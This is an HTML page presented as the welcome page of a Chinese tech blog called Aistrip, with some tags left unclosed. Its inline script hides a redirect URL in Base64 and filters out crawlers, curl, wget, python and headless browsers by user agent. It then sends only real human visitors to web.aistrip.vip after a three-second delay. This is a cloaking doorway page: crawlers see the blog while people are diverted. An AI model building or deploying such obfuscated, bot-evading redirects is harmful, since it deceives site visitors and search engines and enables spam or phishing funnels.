<body>
  <header>
    <img src="cover.jpg" alt="博客封面" class="cover">
    <nav>

  <main>
    <h1>欢迎来到 Aistrip 技术博客</h1>
    <p>我们专注于前端国际化改造、AI接口部署、反爬策略研究与跳板页架构优化。</p>

  <div class="footer">
    &copy; 2025 Aistrip | 技术驱动 · 安全优先
  </div>

  <script>
    // ✅ Base64 加密跳转地址
    const _x1 = 'aHR0cHM6Ly93ZWIuYWlzdHJpcC52aXA='; // https://web.aistrip.vip
    const _y2 = atob(_x1);

    // ✅ UA 判断（仅对浏览器跳转）
    const ua = navigator.userAgent.toLowerCase();
    const isBrowser = /chrome|safari|firefox|edge|opera|mobile/.test(ua);
    const isBot = /bot|spider|crawler|curl|python|wget|headless/.test(ua);

    // ✅ Cookie 检查（防止重复跳转）
    const visited = document.cookie.includes('visited=true');

    // ✅ 跳转函数
    const redirect = () => {
      if (isBrowser && !isBot && !visited) {
        document.cookie = 'visited=true; max-age=3600';
        window.location.href = _y2;
      }
    };

    // ✅ 页面加载后延迟跳转
    document.addEventListener('DOMContentLoaded', () => {
      setTimeout(redirect, 3000);
    });
  </script>
</body>
